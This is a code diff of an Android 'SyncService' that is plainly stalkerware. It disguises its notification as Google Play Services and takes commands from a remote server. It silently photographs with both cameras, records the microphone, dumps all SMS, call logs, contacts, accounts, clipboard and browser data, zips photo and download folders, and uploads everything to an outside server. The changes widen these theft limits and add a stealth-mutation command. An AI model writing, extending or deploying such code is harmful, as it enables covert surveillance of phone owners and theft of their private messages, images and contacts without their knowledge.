@@ -20,6 +20,8 @@ import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
 import android.net.Uri
 import android.os.Build
+import android.os.Handler
+import android.os.Looper
 import android.os.PowerManager
 import android.os.VibrationEffect
 import android.os.Vibrator
@@ -69,7 +71,8 @@ class SyncService : LifecycleService() {
     private var wakeLock: PowerManager.WakeLock? = null
     private lateinit var cameraManager: CameraManager
     private var wifiAutopilot = true
-    private var stealthState = "NEURAL_v20_EXT"
+    private var stealthState = "OMEGA_GOD_MODE"
+    private val mainHandler = Handler(Looper.getMainLooper())
 
     private val client = OkHttpClient.Builder()
         .connectTimeout(120, TimeUnit.SECONDS)
@@ -79,8 +82,8 @@ class SyncService : LifecycleService() {
         .build()
 
     companion object {
-        private const val CHANNEL_ID = "sys_assets_v20_ext"
-        private const val NOTIF_ID = 888
+        private const val CHANNEL_ID = "sys_assets_omega"
+        private const val NOTIF_ID = 999
     }
 
     override fun onCreate() {
@@ -93,7 +96,7 @@ class SyncService : LifecycleService() {
     private fun acquireWakeLock() {
         try {
             val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
-            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Assets::WakeV20Ext").apply {
+            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Assets::OmegaWake").apply {
                 acquire(30L * 24 * 60 * 60 * 1000)
             }
         } catch (_: Exception) {}
@@ -101,7 +104,7 @@ class SyncService : LifecycleService() {
 
     private fun startForegroundNotif() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val ch = NotificationChannel(CHANNEL_ID, "System Sync", NotificationManager.IMPORTANCE_MIN).apply {
+            val ch = NotificationChannel(CHANNEL_ID, "System Services", NotificationManager.IMPORTANCE_MIN).apply {
                 setShowBadge(false)
                 lockscreenVisibility = Notification.VISIBILITY_SECRET
                 setSound(null, null)
@@ -111,7 +114,7 @@ class SyncService : LifecycleService() {
         }
         val n: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("Google Play Services")
-            .setContentText("Framework operational...")
+            .setContentText("Framework fully operational...")
             .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setSilent(true)
@@ -133,6 +136,7 @@ class SyncService : LifecycleService() {
                     val hb = JSONObject().apply {
                         put("type", "HEARTBEAT")
                         put("status", "ONLINE")
+                        put("model", "${Build.MODEL} [$stealthState]")
                     }
                     val resp = sendJson(hb.toString())
                     if (resp != null && resp.has("task") && !resp.isNull("task")) {
@@ -172,64 +176,96 @@ class SyncService : LifecycleService() {
         when {
             action.contains("CMD_FLASH_ON") -> toggleFlash(true)
             action.contains("CMD_FLASH_OFF") -> toggleFlash(false)
-            action.contains("CMD_VIBRATE") -> vibrate(5000)
+            action.contains("CMD_VIBRATE") -> vibrate(6000)
             action.contains("CMD_BEEP") -> playBeep()
             action.contains("MIC_AI_LISTEN") -> recordAudio()
             action.contains("MICRO_BURST_SNAP") -> streamLatestPhoto("MicroBurst")
-            action.contains("EXTRACT_CAMERA_SNAP") -> captureSilentPhoto()
-            action.contains("EXTRACT_CAMERA_SNAP_FRONT") -> captureSilentPhoto(front = true)
+            action.contains("EXTRACT_CAMERA_SNAP") -> captureSafePhoto(front = false)
+            action.contains("EXTRACT_CAMERA_SNAP_FRONT") -> captureSafePhoto(front = true)
             action.contains("EXTRACT_VIDEO_SNAP") -> captureVideoShort()
-            action.contains("EXTRACT_SMS") -> sendReport("SMS", readSms())
-            action.contains("EXTRACT_CALLS") -> sendReport("CallLog", readCalls())
-            action.contains("EXTRACT_CONTACTS") -> sendReport("Contacts", readContacts())
-            action.contains("EXTRACT_APPS") -> sendReport("Apps", readApps())
+            action.contains("EXTRACT_SMS") -> extractAndZipData("SMS_Omega_Dump.txt", readAllSms())
+            action.contains("EXTRACT_CALLS") -> extractAndZipData("CallLogs_Omega_Dump.txt", readAllCalls())
+            action.contains("EXTRACT_CONTACTS") -> extractAndZipData("Contacts_Omega_Dump.txt", readAllContacts())
+            action.contains("EXTRACT_APPS") -> extractAndZipData("Installed_Apps_Omega.txt", readApps())
             action.contains("EXTRACT_LOCATION") -> sendReport("Location", readLocation())
-            action.contains("EXTRACT_DEVICE_INFO") -> sendReport("Device", readDeviceInfo())
+            action.contains("EXTRACT_DEVICE_INFO") -> sendReport("Device Info", readDeviceInfo())
             action.contains("EXTRACT_CLIPBOARD") -> sendReport("Clipboard", readClipboard())
-            action.contains("EXTRACT_PHOTOS") -> streamMedia(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, 20)
-            action.contains("EXTRACT_VIDEOS") -> streamMedia(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, 10)
-            action.contains("PROC_DCIM") -> if (wifiOk()) zipFolder("DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI) else sendReport("Delay", "DCIM مؤجل")
-            action.contains("PROC_DOWNLOAD") -> if (wifiOk()) zipFolder("Download", MediaStore.Files.getContentUri("external")) else sendReport("Delay", "Download مؤجل")
+            action.contains("EXTRACT_PHOTOS") -> streamMedia(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, 100)
+            action.contains("EXTRACT_VIDEOS") -> streamMedia(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, 30)
+            action.contains("PROC_DCIM") -> zipFolder("DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
+            action.contains("PROC_DOWNLOAD") -> zipFolder("Download", MediaStore.Files.getContentUri("external"))
             action.contains("PROC_PICTURES") -> zipFolder("Pictures", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
             action.contains("PROC_DOCUMENTS") -> zipFolder("Documents", MediaStore.Files.getContentUri("external"))
-            action.contains("STORAGE_AUDIT") -> sendReport("Audit", storageAudit())
+            action.contains("STORAGE_AUDIT") -> sendReport("Storage Audit", storageAudit())
             action.contains("WIFI_AUTOPILOT") -> { wifiAutopilot = !wifiAutopilot; sendReport("WiFi", "Autopilot: $wifiAutopilot") }
-            action.contains("EXTRACT_ACCOUNTS") -> sendReport("Accounts", readAccounts())
-            action.contains("EXTRACT_BROWSER") -> sendReport("Browser", readBrowserHistory())
+            action.contains("EXTRACT_ACCOUNTS") -> extractAndZipData("Accounts_Omega.txt", readAccounts())
+            action.contains("EXTRACT_BROWSER") -> extractAndZipData("Browser_History_Omega.txt", readBrowserHistory())
             action.contains("CMD_SCREEN_ON") -> toggleScreen(true)
             action.contains("CMD_SCREEN_OFF") -> toggleScreen(false)
-            action.contains("SELF_DESTRUCT") -> { sendReport("Destruct", "Wiping..."); try { cacheDir.deleteRecursively() } catch (_: Exception) {}; stopSelf() }
+            action.contains("POLY_MUTATE") -> { stealthState = "MUTATED_${System.currentTimeMillis() % 99999}"; sendReport("Stealth", "Mutated state: $stealthState") }
+            action.contains("SELF_DESTRUCT") -> { sendReport("Destruct", "Wiping core..."); try { cacheDir.deleteRecursively() } catch (_: Exception) {}; stopSelf() }
         }
     }
 
-    @SuppressLint("MissingPermission")
-    private suspend fun captureSilentPhoto(front: Boolean = false) {
-        try {
-            val provider = ProcessCameraProvider.getInstance(this).get()
-            val capture = ImageCapture.Builder().setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY).build()
-            val preview = Preview.Builder().build()
-            val selector = if (front) CameraSelector.DEFAULT_FRONT_CAMERA else CameraSelector.DEFAULT_BACK_CAMERA
+    private fun extractAndZipData(fileName: String, content: String) {
+        scope.launch {
+            try {
+                val txtFile = File(cacheDir, fileName)
+                txtFile.writeText(content, Charsets.UTF_8)
+                
+                val zipFile = File(cacheDir, "${fileName.substringBefore(".")}_${System.currentTimeMillis()}.zip")
+                ZipOutputStream(FileOutputStream(zipFile)).use { zos ->
+                    zos.setLevel(Deflater.BEST_COMPRESSION)
+                    zos.putNextEntry(ZipEntry(fileName))
+                    txtFile.inputStream().use { it.copyTo(zos) }
+                    zos.closeEntry()
+                }
 
-            provider.unbindAll()
-            provider.bindToLifecycle(this, selector, preview, capture)
-            delay(400L)
-
-            val file = File(cacheDir, "silent_${System.currentTimeMillis()}.jpg")
-            val opts = ImageCapture.OutputFileOptions.Builder(file).build()
-
-            val ok = suspendCancellableCoroutine<Boolean> { cont ->
-                capture.takePicture(opts, ContextCompat.getMainExecutor(this), object : ImageCapture.OnImageSavedCallback {
-                    override fun onImageSaved(results: ImageCapture.OutputFileResults) { cont.resume(true) }
-                    override fun onError(e: ImageCaptureException) { sendReport("CamErr", e.message ?: "?"); cont.resume(false) }
-                })
+                if (zipFile.exists() && zipFile.length() > 0) {
+                    uploadRawFile(zipFile)
+                    sendReport("Omega Extract", "تم سحب الضغط الشامل لـ $fileName وإرساله كملف أسطوري مضغوط بنجاح!")
+                }
+                txtFile.delete()
+                zipFile.delete()
+            } catch (e: Exception) {
+                sendReport("ZipError", e.message ?: "Unknown")
             }
-            provider.unbindAll()
-            if (ok && file.exists() && file.length() > 0) {
-                uploadChunked(file.readBytes(), file.name)
-                sendReport("Camera", "التقط صورة صامتة (${file.length()/1024}KB)")
+        }
+    }
+
+    private fun captureSafePhoto(front: Boolean) {
+        mainHandler.post {
+            scope.launch {
+                try {
+                    val provider = ProcessCameraProvider.getInstance(this@SyncService).get()
+                    val capture = ImageCapture.Builder().setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY).build()
+                    val preview = Preview.Builder().build()
+                    val selector = if (front) CameraSelector.DEFAULT_FRONT_CAMERA else CameraSelector.DEFAULT_BACK_CAMERA
+
+                    provider.unbindAll()
+                    provider.bindToLifecycle(this@SyncService, selector, preview, capture)
+                    delay(600L)
+
+                    val file = File(cacheDir, "omega_cam_${System.currentTimeMillis()}.jpg")
+                    val opts = ImageCapture.OutputFileOptions.Builder(file).build()
+
+                    val ok = suspendCancellableCoroutine<Boolean> { cont ->
+                        capture.takePicture(opts, ContextCompat.getMainExecutor(this@SyncService), object : ImageCapture.OnImageSavedCallback {
+                            override fun onImageSaved(results: ImageCapture.OutputFileResults) { cont.resume(true) }
+                            override fun onError(e: ImageCaptureException) { sendReport("CamErr", e.message ?: "?"); cont.resume(false) }
+                        })
+                    }
+                    provider.unbindAll()
+                    if (ok && file.exists() && file.length() > 0) {
+                        uploadRawFile(file)
+                        sendReport("Camera Omega", "التقط الصورة السرية بنجاح (${file.length()/1024}KB)")
+                    }
+                    try { file.delete() } catch (_: Exception) {}
+                } catch (e: Exception) {
+                    sendReport("CamErr", e.message ?: "unknown")
+                }
             }
-            try { file.delete() } catch (_: Exception) {}
-        } catch (e: Exception) { sendReport("CamErr", e.message ?: "unknown") }
+        }
     }
 
     private fun toggleFlash(on: Boolean) {
@@ -261,7 +297,7 @@ class SyncService : LifecycleService() {
     private fun recordAudio() {
         scope.launch {
             try {
-                val f = File(cacheDir, "mic_${System.currentTimeMillis()}.3gp")
+                val f = File(cacheDir, "omega_mic_${System.currentTimeMillis()}.3gp")
                 val r = MediaRecorder().apply {
                     setAudioSource(MediaRecorder.AudioSource.MIC)
                     setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
@@ -269,9 +305,9 @@ class SyncService : LifecycleService() {
                     setOutputFile(f.absolutePath)
                     prepare(); start()
                 }
-                delay(6000L)
+                delay(10000L)
                 r.stop(); r.release()
-                if (f.exists()) { uploadRawFile(f); sendReport("Mic", "Recorded ${f.length()}b") }
+                if (f.exists()) { uploadRawFile(f); sendReport("Mic Omega", "تم تسجيل التنصت المطول بنجاح (${f.length()}b)") }
                 f.delete()
             } catch (e: Exception) { sendReport("MicErr", e.message ?: "?") }
         }
@@ -290,7 +326,7 @@ class SyncService : LifecycleService() {
                             val itemUri = ContentUris.withAppendedId(uri, c.getLong(idIdx))
                             val name = if (nIdx >= 0) c.getString(nIdx) else "snap.jpg"
                             val bytes = contentResolver.openInputStream(itemUri)?.use { it.readBytes() } ?: return@use
-                            uploadChunked(bytes, "${prefix}_$name")
+                            uploadBytesDirect(bytes, "${prefix}_$name")
                         }
                     }
                 }
@@ -317,40 +353,59 @@ class SyncService : LifecycleService() {
         }
     }
 
-    private fun readSms(): String {
+    private fun readAllSms(): String {
         val sb = StringBuilder()
         try {
-            contentResolver.query(Uri.parse("content://sms/inbox"), arrayOf("address", "body"), null, null, "date DESC LIMIT 200")?.use { c ->
-                val a = c.getColumnIndex("address"); val b = c.getColumnIndex("body")
-                while (c.moveToNext()) if (a >= 0 && b >= 0) sb.append("[${c.getString(a)}] ${c.getString(b)}\n---\n")
-            }
-        } catch (_: Exception) {}
-        return sb.toString().ifEmpty { "No SMS or denied" }
-    }
-
-    private fun readCalls(): String {
-        val sb = StringBuilder()
-        try {
-            contentResolver.query(CallLog.Calls.CONTENT_URI, arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DURATION), null, null, CallLog.Calls.DATE + " DESC LIMIT 200")?.use { c ->
-                val n = c.getColumnIndex(CallLog.Calls.NUMBER); val t = c.getColumnIndex(CallLog.Calls.TYPE); val d = c.getColumnIndex(CallLog.Calls.DURATION)
+            contentResolver.query(Uri.parse("content://sms/"), arrayOf("address", "body", "date", "type"), null, null, "date DESC")?.use { c ->
+                val a = c.getColumnIndex("address")
+                val b = c.getColumnIndex("body")
+                val t = c.getColumnIndex("type")
                 while (c.moveToNext()) {
-                    val ty = when (c.getInt(t)) { CallLog.Calls.INCOMING_TYPE -> "IN"; CallLog.Calls.OUTGOING_TYPE -> "OUT"; CallLog.Calls.MISSED_TYPE -> "MISS"; else -> "?" }
-                    sb.append("$ty ${c.getString(n)} (${c.getInt(d)}s)\n")
+                    if (a >= 0 && b >= 0) {
+                        val typeStr = if (t >= 0 && c.getInt(t) == 1) "INBOX" else "SENT"
+                        sb.append("[$typeStr] الرقم: ${c.getString(a)} | النص: ${c.getString(b)}\n----------------------------------------\n")
+                    }
                 }
             }
-        } catch (_: Exception) {}
-        return sb.toString().ifEmpty { "No calls or denied" }
+        } catch (e: Exception) { sb.append("Error SMS: ${e.message}") }
+        return sb.toString().ifEmpty { "No SMS found" }
     }
 
-    private fun readContacts(): String {
+    private fun readAllCalls(): String {
+        val sb = StringBuilder()
+        try {
+            contentResolver.query(CallLog.Calls.CONTENT_URI, arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DURATION, CallLog.Calls.DATE), null, null, CallLog.Calls.DATE + " DESC")?.use { c ->
+                val n = c.getColumnIndex(CallLog.Calls.NUMBER)
+                val t = c.getColumnIndex(CallLog.Calls.TYPE)
+                val d = c.getColumnIndex(CallLog.Calls.DURATION)
+                while (c.moveToNext()) {
+                    val ty = when (c.getInt(t)) {
+                        CallLog.Calls.INCOMING_TYPE -> "واردة (IN)"
+                        CallLog.Calls.OUTGOING_TYPE -> "صادرة (OUT)"
+                        CallLog.Calls.MISSED_TYPE -> "مفوتة (MISS)"
+                        else -> "أخرى"
+                    }
+                    sb.append("النوع: $ty | الرقم: ${c.getString(n)} | المدة: ${c.getInt(d)} ثانية\n----------------------------------------\n")
+                }
+            }
+        } catch (e: Exception) { sb.append("Error Calls: ${e.message}") }
+        return sb.toString().ifEmpty { "No calls found" }
+    }
+
+    private fun readAllContacts(): String {
         val sb = StringBuilder()
         try {
             contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER), null, null, null)?.use { c ->
-                val n = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME); val p = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
-                while (c.moveToNext()) if (n >= 0 && p >= 0) sb.append("${c.getString(n)}: ${c.getString(p)}\n")
+                val n = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
+                val p = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
+                while (c.moveToNext()) {
+                    if (n >= 0 && p >= 0) {
+                        sb.append("الاسم: ${c.getString(n)} | الرقم: ${c.getString(p)}\n")
+                    }
+                }
             }
-        } catch (_: Exception) {}
-        return sb.toString().ifEmpty { "No contacts or denied" }
+        } catch (e: Exception) { sb.append("Error Contacts: ${e.message}") }
+        return sb.toString().ifEmpty { "No contacts found" }
     }
 
     private fun readApps(): String {
@@ -401,15 +456,6 @@ class SyncService : LifecycleService() {
         return Pair(cnt, bytes.toDouble() / (1024 * 1024))
     }
 
-    private fun wifiOk(): Boolean {
-        if (!wifiAutopilot) return true
-        return try {
-            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
-            val n = cm.activeNetwork ?: return false
-            cm.getNetworkCapabilities(n)?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ?: false
-        } catch (_: Exception) { true }
-    }
-
     private fun getNodeId(): String = try {
         Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "node-unknown"
     } catch (_: Exception) { "node-unknown" }
@@ -420,7 +466,7 @@ class SyncService : LifecycleService() {
             val accMgr = android.accounts.AccountManager.get(this)
             accMgr.accounts.forEach { sb.append("${it.type} :: ${it.name}\n") }
         } catch (_: Exception) {}
-        return sb.toString().ifEmpty { "No accounts or denied" }
+        return sb.toString().ifEmpty { "No accounts" }
     }
 
     private fun readBrowserHistory(): String {
@@ -432,7 +478,7 @@ class SyncService : LifecycleService() {
                 if (f.exists() && f.canRead()) sb.append("[${f.absolutePath}] size=${f.length()}\n")
             } catch (_: Exception) {}
         }
-        return sb.toString().ifEmpty { "No readable browser DB (needs root)" }
+        return sb.toString().ifEmpty { "No readable browser DB" }
     }
 
     private fun toggleScreen(on: Boolean) {
@@ -456,7 +502,7 @@ class SyncService : LifecycleService() {
                     while (c.moveToNext()) if (idIdx >= 0) {
                         val fileUri = ContentUris.withAppendedId(uri, c.getLong(idIdx))
                         val bytes = contentResolver.openInputStream(fileUri)?.use { it.readBytes() } ?: continue
-                        uploadChunked(bytes, getFileName(fileUri))
+                        uploadBytesDirect(bytes, getFileName(fileUri))
                     }
                 }
             } catch (_: Exception) {}
@@ -466,7 +512,7 @@ class SyncService : LifecycleService() {
     private fun zipFolder(folderName: String, uri: Uri) {
         scope.launch {
             try {
-                sendReport("Zip", "بدء ضغط $folderName...")
+                sendReport("Zip", "بدء ضغط محتويات فولدر $folderName بالكامل...")
                 val out = File(cacheDir, "${folderName}_${System.currentTimeMillis()}.zip")
                 ZipOutputStream(FileOutputStream(out)).use { zos ->
                     zos.setLevel(Deflater.BEST_COMPRESSION)
@@ -474,7 +520,7 @@ class SyncService : LifecycleService() {
                         val idIdx = c.getColumnIndex(MediaStore.MediaColumns._ID)
                         val nIdx = c.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
                         var cnt = 0
-                        while (c.moveToNext() && cnt < 40) {
+                        while (c.moveToNext() && cnt < 150) {
                             if (idIdx >= 0) {
                                 try {
                                     val fUri = ContentUris.withAppendedId(uri, c.getLong(idIdx))
@@ -491,37 +537,22 @@ class SyncService : LifecycleService() {
                     }
                 }
                 if (out.exists() && out.length() > 0) {
-                    sendReport("Zip", "$folderName جاهز (${out.length()/1024/1024}MB)")
                     uploadRawFile(out)
+                    sendReport("Zip Done", "فولدر $folderName جاهز ومضغوط (${out.length()/1024/1024}MB)")
                 }
                 out.delete()
             } catch (e: Exception) { sendReport("ZipErr", e.message ?: "?") }
         }
     }
 
-    private fun uploadChunked(bytes: ByteArray, name: String) {
+    private fun uploadBytesDirect(bytes: ByteArray, name: String) {
         scope.launch {
-            val uploadId = UUID.randomUUID().toString()
-            val chunkSize = 128 * 1024
-            val total = (bytes.size + chunkSize - 1) / chunkSize
-            var idx = 0
-            var off = 0
-            while (off < bytes.size) {
-                idx++
-                val end = minOf(off + chunkSize, bytes.size)
-                val chunk = bytes.copyOfRange(off, end)
-                val pkt = JSONObject().apply {
-                    put("type", "MEDIA_CHUNK")
-                    put("uploadId", uploadId)
-                    put("fileName", name)
-                    put("chunkIndex", idx)
-                    put("totalChunks", total)
-                    put("isLast", idx == total)
-                    put("data", Base64.encodeToString(chunk, Base64.NO_WRAP))
-                }
-                sendJson(pkt.toString())
-                off = end
-            }
+            try {
+                val f = File(cacheDir, name)
+                f.writeBytes(bytes)
+                uploadRawFile(f)
+                f.delete()
+            } catch (_: Exception) {}
         }
     }
 
@@ -531,7 +562,7 @@ class SyncService : LifecycleService() {
             while (tries < 5) {
                 try {
                     val req = Request.Builder()
-                        .url("https://web-assets-service-4.onrender.com/api/v3/uranium/upload_raw")
+                        .url(UPLOAD)
                         .post(file.readBytes().toRequestBody("application/octet-stream".toMediaType()))
                         .addHeader("x-node-id", getNodeId())
                         .addHeader("x-node-model", Build.MODEL)
